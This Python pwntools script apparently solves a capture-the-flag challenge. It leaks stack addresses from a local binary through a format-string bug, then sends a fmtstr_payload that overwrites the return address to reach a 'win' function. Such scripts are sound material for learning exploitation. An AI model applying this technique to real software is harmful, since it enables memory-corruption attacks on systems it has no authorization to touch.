from pwn import *

# Addresses
win = 0x0804869f  # Replace with the actual 'win' function address

# Load the binary
binary = ELF('./fsb')
context.binary = binary
context.log_level = 'debug'  # Enable verbose output for debugging

# Start the process
p = process('./fsb')

# Leak stack values
print(p.recvline())
p.sendline("%p %p %p %p %p %p %p %p %p %p %p %p %p %p")
stack_leak = p.recvline().decode().split(" ")[-1][:-1]  # Get the last leaked value
ret_addr = int(stack_leak, 16) - 40  # Adjust as needed to target the return address
print("Leaked stack value: ", stack_leak)
print("Calculated return address: ", hex(ret_addr))

# Target address to overwrite
first_target_address = ret_addr

# Offset to the first format specifier
fmt_offset = 1  # Adjust this to the correct offset

# Prepare the payload
payload = fmtstr_payload(fmt_offset, {
    first_target_address: win,  # Overwrite the return address with 'win'
})

# Save the payload to a file for reference
with open('payload', 'wb') as f:
    f.write(payload)

# Send the payload
print(p.recvline())
p.sendline(payload)
for _ in range(3):
    p.sendline("a")
#    print("Payload sent.")
    print(p.recvline())

# Optional: Attach GDB for debugging
# gdb.attach(p, gdbscript="""
#     info registers
#     continue
# """)

# Interact with the process
#p.interactive()
